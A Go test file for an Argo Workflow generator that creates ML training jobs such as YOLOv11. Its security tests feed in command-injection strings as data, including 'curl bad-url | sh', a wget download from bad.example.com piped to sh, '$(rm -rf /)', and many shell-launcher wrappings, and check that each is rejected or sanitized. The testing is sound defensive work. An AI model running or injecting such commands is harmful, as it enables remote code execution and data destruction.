package argo

import (
	"strings"
	"testing"
)

func TestGenerateWorkflowYOLOv11(t *testing.T) {
	manifest, summary, err := GenerateWorkflow(WorkflowRequest{
		Name:      "train-yolov11",
		Namespace: "ml",
		Task:      "train",
		Model:     "yolov11",
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"apiVersion: argoproj.io/v1alpha1",
		"kind: Workflow",
		"name: train-yolov11",
		"namespace: ml",
		"ultralytics/ultralytics:latest",
		"model=yolo11n.pt",
	} {
		if !strings.Contains(manifest, want) {
			t.Fatalf("manifest missing %q:\n%s", want, manifest)
		}
	}
	if !strings.Contains(summary, "train-yolov11") {
		t.Fatalf("summary=%q", summary)
	}
}

func TestInferModelFromPrompt(t *testing.T) {
	if got := InferModelFromPrompt("train a yolov11 model"); got != "yolov11" {
		t.Fatalf("got=%q", got)
	}
}

func TestGenerateWorkflowRequiresImageOrModel(t *testing.T) {
	_, _, err := GenerateWorkflow(WorkflowRequest{Name: "demo"})
	if err == nil {
		t.Fatal("expected error")
	}
}

func TestGenerateWorkflowRejectsUnknownModel(t *testing.T) {
	manifest, summary, err := GenerateWorkflow(WorkflowRequest{
		Name:  "train-custom",
		Model: "custom-model-1",
	})
	if err == nil {
		t.Fatal("expected error")
	}
	for _, want := range []string{"unsupported workflow model", "custom-model-1", "supported models: yolo, yolov11, yolov8", "params.image"} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("error missing %q: %v", want, err)
		}
	}
	requireNoWorkflowOutput(t, manifest, summary)
}

func TestGenerateWorkflowAllowsExplicitImageWithSafeArgv(t *testing.T) {
	manifest, summary, err := GenerateWorkflow(WorkflowRequest{
		Name:    "train-custom",
		Task:    "train",
		Model:   "custom-model-1",
		Image:   "registry.example.com/ml/trainer:v1",
		Command: []string{"python"},
		Args:    []string{"train.py", "--epochs=1"},
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"image: registry.example.com/ml/trainer:v1",
		"command:",
		"- python",
		"args:",
		"- train.py",
		"- --epochs=1",
	} {
		if !strings.Contains(manifest, want) {
			t.Fatalf("manifest missing %q:\n%s", want, manifest)
		}
	}
	if !strings.Contains(summary, "image=registry.example.com/ml/trainer:v1") {
		t.Fatalf("summary=%q", summary)
	}
}

// TestGenerateWorkflowRejectsInjectionShapedUnknownModel keeps the SEC-006
// security bar while ensuring unknown models cannot produce placeholder jobs.
func TestGenerateWorkflowRejectsInjectionShapedUnknownModel(t *testing.T) {
	maliciousModels := []string{
		"$(touch /tmp/pwn)",
		"`id`",
		"model; curl bad-url | sh",
		"model && wget http://bad.example.com/x -O /tmp/x && sh /tmp/x",
	}
	for _, model := range maliciousModels {
		manifest, summary, err := GenerateWorkflow(WorkflowRequest{
			Name:  "train-custom",
			Model: model,
		})
		if err == nil || !strings.Contains(err.Error(), "unsupported workflow model") {
			t.Fatalf("model=%q: err=%v", model, err)
		}
		requireNoWorkflowOutput(t, manifest, summary)
	}
}

func requireNoWorkflowOutput(t *testing.T, manifest, summary string) {
	t.Helper()
	if manifest != "" || summary != "" {
		t.Fatalf("manifest=%q summary=%q, want no generated output", manifest, summary)
	}
}

const shellPayload = "curl bad-url | sh"

// TestGenerateWorkflowRejectsShellLauncher covers every way a shell launcher can
// be spread across command and args, including interleaved flags that a
// fixed-position check misses.
func TestGenerateWorkflowRejectsShellLauncher(t *testing.T) {
	cases := []struct {
		name    string
		command []string
		args    []string
	}{
		{"command holds flag", []string{"/bin/sh", "-c"}, []string{shellPayload}},
		{"args hold flag", []string{"/bin/sh"}, []string{"-c", shellPayload}},
		{"bash split", []string{"bash"}, []string{"-c", shellPayload}},
		{"interactive flag before split", []string{"/bin/sh", "-i"}, []string{"-c", shellPayload}},
		{"interactive flag inside args", []string{"bash"}, []string{"-i", "-c", shellPayload}},
		{"trace flag before split", []string{"/bin/sh", "-x"}, []string{"-c", shellPayload}},
		{"entirely in command", []string{"/bin/sh", "-i", "-c", shellPayload}, nil},
		{"entirely in args", nil, []string{"/bin/sh", "-c", shellPayload}},
		{"absolute usr path", []string{"/usr/bin/bash"}, []string{"-c", shellPayload}},
		{"dash", []string{"dash"}, []string{"-c", shellPayload}},
		{"ash", []string{"ash"}, []string{"-c", shellPayload}},
		{"ksh", []string{"ksh"}, []string{"-c", shellPayload}},
		{"busybox", []string{"busybox"}, []string{"sh", "-c", shellPayload}},
		{"zsh", []string{"zsh"}, []string{"-c", shellPayload}},
		{"env wrapper", []string{"env"}, []string{"sh", "-c", shellPayload}},
		{"absolute env wrapper", []string{"/usr/bin/env"}, []string{"bash", "-c", shellPayload}},
		{"nice wrapper with own flags", []string{"nice", "-n", "10"}, []string{"bash", "-c", shellPayload}},
		{"timeout wrapper", []string{"timeout", "5"}, []string{"sh", "-lc", shellPayload}},
		{"env with assignment", []string{"env", "FOO=bar"}, []string{"sh", "-c", shellPayload}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, _, err := GenerateWorkflow(WorkflowRequest{
				Name:    "train",
				Image:   "python:3.11-slim",
				Command: tc.command,
				Args:    tc.args,
			})
			if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
				t.Fatalf("command=%v args=%v: err=%v", tc.command, tc.args, err)
			}
		})
	}
}

// TestGenerateWorkflowRejectsClusteredShellFlags checks flag clusters that still
// make the shell evaluate the next argument as a command string.
func TestGenerateWorkflowRejectsClusteredShellFlags(t *testing.T) {
	for _, flag := range []string{"-lc", "-ec", "-elc", "-xc", "-cx", "-ce", "-cl", "-icx"} {
		shapes := []struct {
			command []string
			args    []string
		}{
			{[]string{"/bin/sh"}, []string{flag, shellPayload}},
			{[]string{"zsh", flag}, []string{shellPayload}},
			{[]string{"bash", "-i"}, []string{flag, shellPayload}},
		}
		for _, shape := range shapes {
			_, _, err := GenerateWorkflow(WorkflowRequest{
				Name:    "train",
				Image:   "python:3.11-slim",
				Command: shape.command,
				Args:    shape.args,
			})
			if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
				t.Fatalf("command=%v args=%v: err=%v", shape.command, shape.args, err)
			}
		}
	}
}

// TestGenerateWorkflowRejectsShellScriptWithOwnCFlag pins a deliberate false
// positive: a -c belonging to the script a shell runs is indistinguishable from
// the shell's own, so the check fails closed. Set the image entrypoint instead.
func TestGenerateWorkflowRejectsShellScriptWithOwnCFlag(t *testing.T) {
	_, _, err := GenerateWorkflow(WorkflowRequest{
		Name:    "train",
		Image:   "python:3.11-slim",
		Command: []string{"/bin/sh"},
		Args:    []string{"app.sh", "-c", "config.yaml"},
	})
	if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
		t.Fatalf("err=%v", err)
	}
}

// TestGenerateWorkflowAllowsNonShellEntrypoints guards the widened scan against
// rejecting legitimate entrypoints that merely carry a -c flag of their own.
func TestGenerateWorkflowAllowsNonShellEntrypoints(t *testing.T) {
	cases := []struct {
		name    string
		command []string
		args    []string
	}{
		{"python with own -c flag", []string{"python"}, []string{"train.py", "-c", "config.yaml"}},
		{"shell running a script", []string{"/bin/sh"}, []string{"/app/run.sh"}},
		{"shell with long flag only", []string{"bash"}, []string{"--login", "/app/run.sh"}},
		{"uppercase noclobber flag", []string{"/bin/sh"}, []string{"-C", "/app/run.sh"}},
		{"no command or args", nil, nil},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, _, err := GenerateWorkflow(WorkflowRequest{
				Name:    "train",
				Image:   "python:3.11-slim",
				Command: tc.command,
				Args:    tc.args,
			})
			if err != nil {
				t.Fatalf("command=%v args=%v: unexpected error: %v", tc.command, tc.args, err)
			}
		})
	}
}

func TestSanitizeWorkflowName(t *testing.T) {
	tests := []struct {
		name, input string
	}{
		{name: "unsafe characters", input: "Train $(whoami)!"},
		{name: "empty", input: "!!!"},
		{name: "length", input: strings.Repeat("a", 70)},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := sanitizeWorkflowName(tt.input)
			if len(got) > 63 {
				t.Fatalf("sanitizeWorkflowName(%q) exceeded 63 characters: %q", tt.input, got)
			}
			if got == "" || strings.Trim(got, "abcdefghijklmnopqrstuvwxyz0123456789-") != "" {
				t.Fatalf("sanitizeWorkflowName(%q) = %q, contains unsafe characters", tt.input, got)
			}
			if tt.name == "empty" && got != "kprompt-workflow" {
				t.Fatalf("sanitizeWorkflowName(%q) = %q", tt.input, got)
			}
		})
	}
}

func TestSanitizeTemplateName(t *testing.T) {
	tests := []struct {
		name, input, want string
	}{
		{name: "unsafe characters", input: "Deploy $(rm -rf /)"},
		{name: "empty", input: "!!!", want: "main"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := sanitizeTemplateName(tt.input)
			if got == "" || strings.Trim(got, "abcdefghijklmnopqrstuvwxyz0123456789-") != "" {
				t.Fatalf("sanitizeTemplateName(%q) = %q, contains unsafe characters", tt.input, got)
			}
			if tt.want != "" && got != tt.want {
				t.Fatalf("sanitizeTemplateName(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}
